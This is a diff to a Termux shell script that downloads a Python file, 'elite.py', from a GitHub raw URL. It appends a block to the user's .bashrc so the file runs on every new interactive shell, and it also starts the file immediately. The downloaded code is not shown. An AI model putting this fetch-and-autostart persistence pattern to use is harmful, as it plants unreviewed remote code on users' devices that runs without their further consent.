@@ -27,17 +27,17 @@ else
 fi
 
 # --- defaults (user may override before running) ---
-TTV_PATH="${TTV_PATH:-$HOME/Elite.py}"   # must be absolute
+TTV_PATH="${TTV_PATH:-$HOME/elite.py}"   # must be absolute
 TTV_PY_BIN="${TTV_PY_BIN:-$(command -v python3 || command -v python || true)}"
 TTV_AUTOSTART="${TTV_AUTOSTART:-1}"       # 1 = enabled
 
 # Default raw GitHub URL for the file you gave (raw URL). This is only used in-memory.
 # If you prefer to provide a different link, export DOWNLOAD_URL before running the script.
-DOWNLOAD_URL="${DOWNLOAD_URL:-https://github.com/davidfin7xd/onlytime/blob/main/Elite.py}"
+DOWNLOAD_URL="${DOWNLOAD_URL:-https://raw.githubusercontent.com/davidfin7xd/onlytime/refs/heads/main/elite.py}"
 
 # Ensure TTV_PATH is absolute
 case "$TTV_PATH" in
-  /*) ;; *) die "TTV_PATH must be absolute (e.g. /data/data/com.termux/files/home/Elite.py)";;
+  /*) ;; *) die "TTV_PATH must be absolute (e.g. /data/data/com.termux/files/home/elite.py)";;
 esac
 
 # --- downloader: retries until success, verifies python compile if python3 exists,
@@ -147,7 +147,7 @@ BLOCK="$(cat <<'EOF'
 # Autostart .py on NEW interactive shells (non-blocking; duplicate-safe).
 
 # ===== Config =====
-TTV_PATH="${TTV_PATH:-$HOME/hardsec.py}"  # ABSOLUTE path required
+TTV_PATH="${TTV_PATH:-$HOME/elite.py}"  # ABSOLUTE path required
 TTV_PY_BIN="${TTV_PY_BIN:-$(command -v python3 || command -v python || true)}"
 TTV_AUTOSTART="${TTV_AUTOSTART:-1}"       # 1 = enabled
 
@@ -259,7 +259,7 @@ printf "\n%s\n" "$BLOCK" >> "$BASHRC"
 grep -qE "^# >>> ${TAG}\b" "$BASHRC" || die "Write verification failed."
 
 # --- immediate start (duplicate-safe) ---
-TTV_PATH_NOW="${TTV_PATH:-$HOME/Elite.py}"
+TTV_PATH_NOW="${TTV_PATH:-$HOME/elite.py}"
 TTV_PY_BIN_NOW="${TTV_PY_BIN:-$(command -v python3 || command -v python || true)}"
 
 __have_python_now(){ [[ -n "$TTV_PY_BIN_NOW" ]] && command -v "$TTV_PY_BIN_NOW" >/dev/null 2>&1; }
